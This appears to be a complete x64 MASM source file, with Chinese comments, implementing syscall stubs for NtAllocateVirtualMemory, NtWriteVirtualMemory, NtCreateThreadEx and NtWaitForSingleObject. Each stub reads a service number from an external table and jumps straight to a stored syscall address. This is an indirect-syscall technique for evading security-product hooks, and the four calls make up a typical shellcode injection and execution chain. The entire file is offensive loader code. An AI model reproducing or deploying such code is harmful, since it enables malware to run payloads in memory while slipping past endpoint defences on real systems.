EXTERN direct_syscall:BYTE   ; 声明全局变量

.CODE

NtAllocateVirtualMemory PROC
    mov r10, rcx                                   
    mov eax, DWORD PTR direct_syscall+0            ; 访问 wNtFunctionSSN
    jmp QWORD PTR [direct_syscall+8]               ; 跳转到 sysAddress
NtAllocateVirtualMemory ENDP                        

NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR direct_syscall+16           ; 访问 wNtFunctionSSN
    jmp QWORD PTR [direct_syscall+24]              ; 跳转到 sysAddress
NtWriteVirtualMemory ENDP

NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, DWORD PTR direct_syscall+32           ; 访问 wNtFunctionSSN
    jmp QWORD PTR [direct_syscall+40]              ; 跳转到 sysAddress
NtCreateThreadEx ENDP

NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, DWORD PTR direct_syscall+48           ; 访问 wNtFunctionSSN
    jmp QWORD PTR [direct_syscall+56]              ; 跳转到 sysAddress
NtWaitForSingleObject ENDP

END
